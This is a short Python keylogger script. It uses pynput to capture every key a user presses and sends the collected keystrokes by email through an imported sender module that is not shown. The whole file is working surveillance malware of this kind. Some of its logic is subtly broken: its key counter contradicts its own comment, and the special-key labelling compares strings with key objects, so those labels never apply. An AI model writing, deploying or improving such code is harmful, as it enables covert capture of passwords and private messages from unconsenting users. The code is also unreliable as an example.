import pynput
from pynput.keyboard import Key, Listener
import emailsender  # Import the emailsender module

count = 0
keys = []


def on_press(key):
    global keys, count
    print(key, end=" ")
    print("pressed")

    # Track key presses
    try:
        keys.append(str(key))
    except AttributeError:
        keys.append(f"{key}")

    count += 2

    if count > 5:  # Sends an email after 10 keystrokes
        count = 0
        email(keys)


def email(keys):
    message = ""
    for key in keys:
        k = str(key).replace("'", "")

        # Handle space, enter, tab, backspace, alt, and esc separately
        if key == Key.space:
            k = "[SPACE]"
        elif key == Key.enter:
            k = "[ENTER]"
        elif key == Key.tab:
            k = "[TAB]"
        elif key == Key.backspace:
            k = "[BACKSPACE]"
        elif key == Key.alt:
            k = "[ALT]"
        elif key == Key.esc:
            k = "[ESC]"
        # For regular alphabetic keys, keep as is
        elif hasattr(key, 'char') and key.char is not None:
            k = key.char
        else:
            k = str(key)  # Handle other special keys

        message += k + " "  # Add space between keys for better readability

    print(message)
    emailsender.sendEmail(message)


def on_release(key):
    if key == Key.esc:  # Stops the listener when Escape is pressed
        return False


# Add exception handling for graceful termination
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Keylogger interrupted and stopped.")


